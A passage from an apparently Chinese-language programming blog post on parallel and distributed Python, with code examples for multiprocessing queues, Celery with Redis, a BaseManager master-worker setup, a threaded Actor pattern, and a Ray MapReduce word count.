for n &lt; 0'</span>)<br>    <span class="hljs-keyword">return</span> fib(n - <span class="hljs-number">1</span>) + fib(n - <span class="hljs-number">2</span>)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">worker</span><span class="hljs-params">(inq, outq)</span>:</span><br>    <span class="hljs-string">"inq 任务队列， outq 输出队列"</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        data = inq.get()<br>        <span class="hljs-keyword">if</span> data <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>: <span class="hljs-comment"># 检测 哨兵值</span><br>            <span class="hljs-keyword">return</span><br>        fn, arg = data<br>        outq.put(fn(arg))<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:<br>    <span class="hljs-keyword">import</span> argparse<br>    parser = argparse.ArgumentParser()<br>    parser.add_argument(<span class="hljs-string">'-n'</span>, type=int, default=<span class="hljs-number">1</span>)<br>    parser.add_argument(<span class="hljs-string">'number'</span>, type=int, nargs=<span class="hljs-string">'?'</span>, default=<span class="hljs-number">34</span>)<br>    args = parser.parse_args()<br>    <span class="hljs-keyword">assert</span> args.n &gt;= <span class="hljs-number">1</span>, <span class="hljs-string">'The number of threads has to be &gt; 1'</span><br>    <br>    tasks = mp.Queue()<br>    results = mp.Queue()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(args.n):<br>        tasks.put((fib, args.number))<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(args.n):<br>        mp.Process(target=worker, args=(tasks, results)).start()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(args.n):<br>        print(results.get())<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(args.n):  <span class="hljs-comment"># 输入哨兵值，停止worker</span><br>        tasks.put(<span class="hljs-literal">None</span>)<br></code></pre></div></td></tr></table></figure><p>开发并行应用的主要难点就是控制数据访问，避免竞争条件或篡改共享数据。要明确何时停止。阿姆达尔定律指出，并行是收益递减的。并行化可能耗时巨大。一定要知道，哪段代码是需要并行化的，理论加速上限又是多少。</p><p>另外，避免收益递减的方法是增加任务量，提升并行任务的占比，这是古斯塔夫森定律的核心。</p><h2><span id="celery">Celery</span></h2><p>Celery（<a href="https://link.jianshu.com/?t=http://www.celeryproject.org/">http://www.celeryproject.org</a>）是用到的第一个第三方库。Celery是一个分布任务队列，就是一个以队列为基础的系统。</p><p>轻量化的队列任务调度包：https://python-rq.org/</p><p>分别在主机安装RabbitMQ （windows: <a href="https://github.com/rabbitmq/rabbitmq-server/releases/download/v3.8.12/rabbitmq-server-3.8.12.exe">exe</a><a href="https://erlang.org/download/otp_versions_tree.html">erlang</a>），ubuntu机器开启redis-server ( sudo apt-get install redis-server )，python环境安装celery，redis。（pip install celery[Redis]）</p><p>就学习示例而言，自己搭建整个环境耗时太大，尤其在windows环境下！最好能云服务器环境，只管写代码，环境一般不会出问题。</p><p>直接在几个虚拟机上测试比较方便。</p><p>在机器1上：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> celery<br> <br>app = celery.Celery(<span class="hljs-string">'test'</span>,<br>                     broker=<span class="hljs-string">'redis://192.168.56.104'</span>,<br>                     backend=<span class="hljs-string">'redis://192.168.56.103'</span>)<br>  <br><span class="hljs-meta">@app.task</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">echo</span><span class="hljs-params">(message)</span>:</span><br>    <span class="hljs-keyword">return</span> message<br></code></pre></div></td></tr></table></figure><p>建立机器1，worker池</p><figure class="highlight nginx"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">celery</span> -A test worker --loglevel=<span class="hljs-literal">info</span><br></code></pre></div></td></tr></table></figure><p><code>celery</code>命令会默认启动CPU数目相同的worker进程。worker会使用<code>test</code>模块中的应用<code>app</code>（我们可以使用实例的名字<code>celery -A test.app worker</code>），并使用<code>INFO</code>等级在控制台显示日志。</p><p>在机器2上（此处即为 master节点），保存一份test.py相同代码</p><p>进入 python 交互环境：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">from</span> test <span class="hljs-keyword">import</span> echo<br></code></pre></div></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ruby"><span class="hljs-meta">&gt;&gt;</span>&gt; res = echo.delay(<span class="hljs-string">'Python rocks!'</span>)<br><span class="hljs-meta">&gt;&gt;</span>&gt; res.result<br></code></pre></div></td></tr></table></figure><p>可以在worker机器上执行程序，并返回结果</p><h4><span id="分布式任务队列">分布式任务队列</span></h4><p>master-worker架构，有一个中间件层，中间件层使用多个任务请求队列（即任务队列），和一个用于存储结果的队列（即结果后台）。</p><p>主进程（也叫作<code>client</code>或<code>producer</code>）将任务请求安插到某个任务队列，从结果后台获取数据。worker进程订阅任务队列以明确任务是什么，并把结果放到结果后台。</p><p>只管定制好 任务队列 和结果后台，其他worker、producer如何变化、什么程序都无所谓。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/pic/python与分布式_pic/image-20210224182217952.png" srcset="/img/loading.gif" lazyload alt style="zoom:50%;"></p><p>也称作 Master Worker 模式：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/pic/python与分布式_pic/image-20210224185036957.png" srcset="/img/loading.gif" lazyload alt style="zoom:70%;"></p><p>Master Worker 示例</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># master.py</span><br><span class="hljs-keyword">import</span> random, time, queue<br><span class="hljs-keyword">from</span> multiprocessing.managers <span class="hljs-keyword">import</span> BaseManager<br><br><span class="hljs-comment"># 发送任务的队列:</span><br>task_queue = queue.Queue()<br><span class="hljs-comment"># 接收结果的队列:</span><br>result_queue = queue.Queue()<br><br><br><span class="hljs-comment"># 从BaseManager继承的QueueManager:</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">QueueManager</span><span class="hljs-params">(BaseManager)</span>:</span><br>    <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-comment"># 把两个Queue都注册到网络上, callable参数关联了Queue对象:</span><br>QueueManager.register(<span class="hljs-string">'get_task_queue'</span>, callable=<span class="hljs-keyword">lambda</span>: task_queue)<br>QueueManager.register(<span class="hljs-string">'get_result_queue'</span>, callable=<span class="hljs-keyword">lambda</span>: result_queue)<br><span class="hljs-comment"># 绑定端口5000, 设置验证码'abc':</span><br>manager = QueueManager(address=(<span class="hljs-string">''</span>, <span class="hljs-number">5000</span>), authkey=<span class="hljs-string">b'abc'</span>)<br><br><span class="hljs-comment"># 启动Queue:</span><br>manager.start()<br><span class="hljs-comment"># 获得通过网络访问的Queue对象:</span><br>task = manager.get_task_queue()<br>result = manager.get_result_queue()<br><br><span class="hljs-comment"># 注册任务</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">10</span>):<br>    n = random.randint(<span class="hljs-number">0</span>, <span class="hljs-number">10000</span>)<br>    print(<span class="hljs-string">'Put task %d...'</span> % n)<br>    task.put(n)<br><br><span class="hljs-comment"># 读取结果:</span><br>print(<span class="hljs-string">'Try get results...'</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">10</span>):<br>    r = result.get(timeout=<span class="hljs-number">10</span>)<br>    print(<span class="hljs-string">'Result: %s'</span> % r)<br><br><span class="hljs-comment"># 关闭:</span><br>manager.shutdown()<br>print(<span class="hljs-string">'master exit.'</span>)<br></code></pre></div></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># worker.py</span><br><span class="hljs-keyword">import</span> time, sys, queue<br><span class="hljs-keyword">from</span> multiprocessing.managers <span class="hljs-keyword">import</span> BaseManager<br><br><br><span class="hljs-comment"># 可以在多个机器上同时开启多个worker</span><br><span class="hljs-comment"># 创建类似的QueueManager:</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">QueueManager</span><span class="hljs-params">(BaseManager)</span>:</span><br>    <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-comment"># 由于这个QueueManager只从网络上获取Queue，所以注册时只提供名字:</span><br>QueueManager.register(<span class="hljs-string">'get_task_queue'</span>)<br>QueueManager.register(<span class="hljs-string">'get_result_queue'</span>)<br><br><span class="hljs-comment"># 连接到服务器，也就是运行task_master.py的机器:</span><br>server_addr = <span class="hljs-string">'127.0.0.1'</span><br>print(<span class="hljs-string">'Connect to server %s...'</span> % server_addr)<br><br><span class="hljs-comment"># 端口和验证码注意保持与task_master.py设置的完全一致:</span><br>m = QueueManager(address=(server_addr, <span class="hljs-number">5000</span>), authkey=<span class="hljs-string">b'abc'</span>)<br><span class="hljs-comment"># 从网络连接:</span><br>m.connect()<br><br><span class="hljs-comment"># 获取Queue的对象:</span><br>task = m.get_task_queue()<br>result = m.get_result_queue()<br><br><span class="hljs-comment"># 从task队列取任务,并把结果写入result队列:</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">10</span>):<br>    <span class="hljs-keyword">try</span>:<br>        n = task.get(timeout=<span class="hljs-number">1</span>)<br>        print(<span class="hljs-string">'run task %d * %d...'</span> % (n, n))<br>        r = <span class="hljs-string">'%d * %d = %d'</span> % (n, n, n * n)<br>        time.sleep(<span class="hljs-number">1</span>)<br>        result.put(r)<br>    <span class="hljs-keyword">except</span> queue.Queue.Empty:<br>        print(<span class="hljs-string">'task queue is empty.'</span>)<br><br><span class="hljs-comment"># 处理结束:</span><br>print(<span class="hljs-string">'worker exit.'</span>)<br></code></pre></div></td></tr></table></figure><p>使用中间件传递消息（基于网络），类似Go语言的channel（基于内存）。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/pic/python与分布式_pic/image-20210224185417007.png" srcset="/img/loading.gif" lazyload alt style="zoom:50%;"></p><p>另一种消息传递方式是，直接传递，Actor模型，一般有一个GlobalSchedule，设计的目的是计算。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/pic/python与分布式_pic/image-20210224185353263.png" srcset="/img/loading.gif" lazyload alt style="zoom:50%;"></p><p>Actor消息传递示例</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># actor.py</span><br><span class="hljs-keyword">from</span> queue <span class="hljs-keyword">import</span> Queue<br><span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread, Event<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ActorExit</span><span class="hljs-params">(Exception)</span>:</span><br>      <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Actor</span><span class="hljs-params">(object)</span>:</span><br>      <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self)</span>:</span><br>          self._mailbox = Queue()<br><br>      <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">send</span><span class="hljs-params">(self, msg)</span>:</span><br>          <span class="hljs-string">"向_mailbox提交任务"</span><br>          self._mailbox.put(msg)<br><br>      <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">recv</span><span class="hljs-params">(self)</span>:</span><br>          <span class="hljs-string">"从_mailbox获取任务"</span><br>          msg = self._mailbox.get()<br>          <span class="hljs-keyword">if</span> msg <span class="hljs-keyword">is</span> ActorExit:<br>              <span class="hljs-keyword">raise</span> ActorExit()<br>          <span class="hljs-keyword">return</span> msg<br><br>      <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">close</span><span class="hljs-params">(self)</span>:</span><br>          self.send(ActorExit)<br><br>      <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">start</span><span class="hljs-params">(self)</span>:</span><br>          <span class="hljs-string">"启动线程执行任务"</span><br>          self._terminated = Event()<br>          t = Thread(target=self._bootstrap)<br>          t.daemon = <span class="hljs-literal">True</span><br>          t.start()<br><br>      <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_bootstrap</span><span class="hljs-params">(self)</span>:</span><br>          <span class="hljs-keyword">try</span>:<br>              self.run()<br>          <span class="hljs-keyword">except</span> ActorExit:<br>              <span class="hljs-keyword">pass</span><br>          <span class="hljs-keyword">finally</span>:<br>              self._terminated.set()<br><br>      <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">join</span><span class="hljs-params">(self)</span>:</span><br>          self._terminated.wait()<br><br>      <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span><span class="hljs-params">(self)</span>:</span><br>          <span class="hljs-string">'''</span><br><span class="hljs-string">          Run method to be implemented by the user</span><br><span class="hljs-string">          '''</span><br>          <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>              msg = self.recv()<br></code></pre></div></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># test_actor.py</span><br><span class="hljs-keyword">from</span> .actor <span class="hljs-keyword">import</span> Actor<br><span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Event<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Result</span><span class="hljs-params">(object)</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self)</span>:</span><br>        self._evt = Event()<br>        self._result = <span class="hljs-literal">None</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">set_result</span><span class="hljs-params">(self, value)</span>:</span><br>        self._result = value<br>        self._evt.set()  <span class="hljs-comment"># 当执行完成计算任务时，解除block</span><br><br><span class="hljs-meta">    @property</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">result</span><span class="hljs-params">(self)</span>:</span><br>        self._evt.wait()  <span class="hljs-comment"># 等待计算结果程序的执行完成，thread block</span><br>        <span class="hljs-keyword">return</span> self._result<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Worker</span><span class="hljs-params">(Actor)</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">submit</span><span class="hljs-params">(self, func, *args, **kwargs)</span>:</span><br>        <span class="hljs-string">"注册任务"</span><br>        r = Result()<br>        self.send((func, args, kwargs, r))<br>        <span class="hljs-keyword">return</span> r<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span><span class="hljs-params">(self)</span>:</span><br>        <span class="hljs-string">"重写actor的run逻辑，执行用户程序"</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            func, args, kwargs, r = self.recv()<br>            r.set_result(func(*args, **kwargs))<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:<br>    worker = Worker()<br>    worker.start()<br>    r = worker.submit(pow, <span class="hljs-number">2</span>, <span class="hljs-number">4</span>)<br>    print(<span class="hljs-string">'it will not block'</span>)<br>    print(r.result)<br></code></pre></div></td></tr></table></figure><h2><span id="ray">Ray</span></h2><p>基于Master Slaves，Actor的分布式框架。<a href="https://docs.ray.io/en/master/ray-overview/index.html">DOC</a> <a href="https://github.com/anyscale/academy">tutorials</a>。分布计算、深度学习调参等等，可是请问在下去哪里能领到更多的物理机器呢。。。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/pic/python与分布式_pic/image-20210224192154714.png" srcset="/img/loading.gif" lazyload alt style="zoom:50%;"></p><p>GlobalScheduler：Master上启动了一个全局调度器，用于接收本地调度器提交的任务，并将任务分发给合适的本地任务调度器执行</p><p>Redis Server：Master上启动了一到多个RedisServer用于保存分布式任务的状态信息（ControlState），包括对象机器的映射、任务描述、任务debug信息等。</p><p>LocalScheduler：每个Slave上启动了一个本地调度器，用于提交任务到全局调度器，以及分配任务给当前机器的Worker进程</p><p>Worker：每个Slave上可以启动多个Worker进程执行分布式任务，并将计算结果存储到ObjectStore，每一个有全局唯一的 Object ID</p><p>Object Store：每个Slave上启动了一个ObjectStore存储只读数据对象，Worker可以通过<strong>共享内存的方式</strong>访问这些对象数据（通过ObjectID），这样可以有效地减少内存拷贝和对象序列化成本。ObjectStore底层由Apache Arrow实现</p><p>Plasma：每个Slave上的ObjectStore都由一个名为Plasma的对象管理器进行管理，它可以在<strong>Worker访问本地ObjectStore上不存在的远程数据对象时，主动拉取其它Slave上的对象数据到当前机器</strong></p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/pic/python与分布式_pic/image-20210224192813155.png" srcset="/img/loading.gif" lazyload alt style="zoom:67%;"></p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/pic/python与分布式_pic/image-20210224192839727.png" srcset="/img/loading.gif" lazyload alt style="zoom:67%;"></p><blockquote><p>Ray简易环境搭建</p><ul><li><p>配置Conda</p><figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim">$ wget http<span class="hljs-variable">s:</span>//repo.anaconda.<span class="hljs-keyword">com</span>/miniconda/Miniconda3-latest-Linux-x86_64.<span class="hljs-keyword">sh</span><br><br>$ <span class="hljs-keyword">sh</span> Miniconda3-latest-Linux-x86_64.<span class="hljs-keyword">sh</span><br></code></pre></div></td></tr></table></figure></li><li><p>安装Ray，推荐python3.7，其他版本存在已知的Bug（官方）</p><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql">$ conda <span class="hljs-keyword">create</span> <span class="hljs-comment">--name ray python=3.7</span><br><br>$ conda <span class="hljs-keyword">activate</span> ray<br><br>$ pip <span class="hljs-keyword">install</span> ray<br></code></pre></div></td></tr></table></figure></li></ul><p>Ray 集群搭建:</p><ul><li>部署Redis服务(下面假设部署在localhost:6379)</li><li>选择任意一台主机作为Master启动 ray start --head --ip localhost--redis-port=6379</li><li>在集群其他机器上启动 ray start--address=[head_node_address]:6379</li></ul></blockquote><p>运行一个MapReduce示例。数据准备，下载Wiki数据，使用WikiExtractor解析：</p><figure class="highlight elixir"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>wget <span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/dumps.wikimedia.org/enwiki</span><span class="hljs-regexp">/latest/enwiki</span>-latest-pages-articles-multistream9.xml-p1791081p2336422.bz2<br><span class="hljs-variable">$ </span>python WikiExtractor.py -o /data enwiki-latest-pages-articles-multistream9.xml-p1791081p2336422.bz2<br></code></pre></div></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> argparse<br><span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> Counter, defaultdict<br><span class="hljs-keyword">import</span> heapq<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> ray<br><br>parser = argparse.ArgumentParser()<br>parser.add_argument(<span class="hljs-string">"--num-mappers"</span>,<br>                    help=<span class="hljs-string">"number of mapper actors used"</span>,<br>                    default=<span class="hljs-number">3</span>,<br>                    type=int)<br>parser.add_argument(<span class="hljs-string">"--num-reducers"</span>,<br>                    help=<span class="hljs-string">"number of reducer actors used"</span>,<br>                    default=<span class="hljs-number">4</span>,<br>                    type=int)<br><br><span class="hljs-meta">@ray.remote</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Mapper</span><span class="hljs-params">(object)</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self, content_stream)</span>:</span><br>        self.content_stream = content_stream<br>        self.num_articles_processed = <span class="hljs-number">0</span><br>        self.articles = []<br>        self.word_counts = []<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_new_article</span><span class="hljs-params">(self)</span>:</span><br>        article = self.content_stream.next()<br>        <span class="hljs-comment"># Count the words and store the result.</span><br>        self.word_counts.append(Counter(article.split(<span class="hljs-string">" "</span>)))<br>        self.num_articles_processed += <span class="hljs-number">1</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_range</span><span class="hljs-params">(self, article_index, keys)</span>:</span><br>        <span class="hljs-string">"""keys: list of 2 chars</span><br><span class="hljs-string">        article_index：当前mapper处理的文章index，需要与GlobalScheduler中任务参数进行通信，</span><br><span class="hljs-string">            保证当前article在整个处理序列中处于article_index的位置"""</span><br>        <span class="hljs-comment"># Process more articles if this Mapper hasn't processed enough yet.</span><br>        <span class="hljs-keyword">while</span> self.num_articles_processed &lt; article_index + <span class="hljs-number">1</span>:<br>            self.get_new_article()<br>        <span class="hljs-comment"># Return the word counts from within a given character range.</span><br>        <span class="hljs-keyword">return</span> [(k, v) <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> self.word_counts[article_index].items()<br>                <span class="hljs-keyword">if</span> len(k) &gt;= <span class="hljs-number">1</span> <span 